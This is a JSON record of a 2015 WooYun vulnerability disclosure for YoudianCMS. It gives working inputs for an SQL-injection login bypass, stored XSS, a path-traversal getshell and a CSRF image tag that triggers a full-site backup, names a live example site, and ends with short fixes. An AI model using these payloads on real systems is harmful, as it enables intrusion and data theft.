{"id": 40498, "wybug_id": "wooyun-2015-091470", "wybug_title": "友点Cms漏洞打包(后台登录绕过/多处存储型Xss/GetShell/Csrf打包整站)", "wybug_corp": "友点CMS", "wybug_author": "浅蓝", "wybug_date": "2015-01-15 14:50", "wybug_open_date": "2015-04-15 14:52", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-15：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 友点Cms漏洞打包(后台登录绕过/多处存储型Xss/GetShell/Csrf打包整站) 详细说明：  官网：youdiancms.comGoogle关键词:inurl:/guestbook.html 技术支持：友点软件1. 后台登录绕过/admin/ 后台目录直接将帐号和密码带入sql语句 没有转义随便拿个案例 http://enmeicy.com/index.php/Admin/public/AdminIndex帐号 'or 1=1#  密码随便\n\n2.存储型Xss第一处 http://****/guestbook.html第二处 http://****/index.php/resume3.html到后台看\n\n3.Getshellhttp://demo.youdiancms.com/index.php/Admin/template/Modify?file=/../../../../x.php\n\n提交后在根目录生成x.php文件\n\n4.csrf打包整站文件+数据库GET 提交http://xxxxx/index.php/Admin/db/backupAll/action/backupall返回信息\n{\"status\":1,\"info\":\"\\u5168\\u7ad9\\u6253\\u5305\\u538b\\u7f29\\u5931\\u8d25!\",\"data\":\"all2015-01-12_14_30_11.zip\"}\n就会在/App/Runtime/ 生成一个 all2015-01-12_14_30_11.zip 文件http://enmeicy.com/index.php/public/reg/l/cn 注册时 密保问题填\"><img src=http://enmeicy.com/index.php/Admin/db/backupAll/action/backupall>（enmeicy.com替换成目标站） 等管理员审核你的会员帐号时  就会生成全站文件看一下生成的文件名结构 all年-月-日-时-分-秒.zip把时间范围确定一下 跑一跑就行了   漏洞证明：  官网：youdiancms.comGoogle关键词:inurl:/guestbook.html 技术支持：友点软件1. 后台登录绕过/admin/ 后台目录直接将帐号和密码带入sql语句 没有转义随便拿个案例 http://enmeicy.com/index.php/Admin/public/AdminIndex帐号 'or 1=1#  密码随便\n\n2.存储型Xss第一处 http://****/guestbook.html第二处 http://****/index.php/resume3.html到后台看\n\n3.Getshellhttp://demo.youdiancms.com/index.php/Admin/template/Modify?file=/../../../../x.php\n\n提交后在根目录生成x.php文件\n\n4.csrf打包整站文件+数据库GET 提交http://xxxxx/index.php/Admin/db/backupAll/action/backupall返回信息\n{\"status\":1,\"info\":\"\\u5168\\u7ad9\\u6253\\u5305\\u538b\\u7f29\\u5931\\u8d25!\",\"data\":\"all2015-01-12_14_30_11.zip\"}\n就会在/App/Runtime/ 生成一个 all2015-01-12_14_30_11.zip 文件http://enmeicy.com/index.php/public/reg/l/cn 注册时 密保问题填\"><img src=http://enmeicy.com/index.php/Admin/db/backupAll/action/backupall>（enmeicy.com替换成目标站） 等管理员审核你的会员帐号时  就会生成全站文件看一下生成的文件名结构 all年-月-日-时-分-秒.zip把时间范围确定一下 跑一跑就行了   修复方案：  1.提交数据时转义一下2.xss也过滤3.对扩展名做限制4.生成文件时加一下随机字符   版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}